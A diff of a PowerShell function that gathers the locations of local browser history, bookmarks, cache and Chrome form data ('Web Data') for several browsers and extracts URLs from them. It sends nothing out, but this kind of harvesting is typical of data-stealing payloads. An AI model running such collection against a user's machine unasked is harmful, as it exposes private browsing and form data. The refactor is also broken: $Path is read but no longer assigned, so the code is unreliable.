@@ -10,14 +10,28 @@ function Get-BrowserData {
 
     $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
 
-    if     ($Browser -eq 'chrome'  -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"}
-    elseif ($Browser -eq 'chrome'  -and $DataType -eq 'bookmarks' )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"}
-    elseif ($Browser -eq 'edge'    -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"}
-    elseif ($Browser -eq 'edge'    -and $DataType -eq 'bookmarks' )  {$Path = "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/Bookmarks"}
-    elseif ($Browser -eq 'firefox' -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"}
-    elseif ($Browser -eq 'opera'   -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"}
-    elseif ($Browser -eq 'opera'   -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"}
+$Paths = @{
+    chrome = @{
+        history   = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
+        bookmarks = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
+        cache     = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Cache"
+        formdata  = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Web Data"
+    }
 
+    edge = @{
+        history   = "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History"
+        bookmarks = "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks"
+    }
+
+    opera = @{
+        history   = "$env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"
+        bookmarks = "$env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"
+    }
+
+    firefox = @{
+        history = "$env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"
+    }
+}
     $Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
     $Value | ForEach-Object {
         $Key = $_
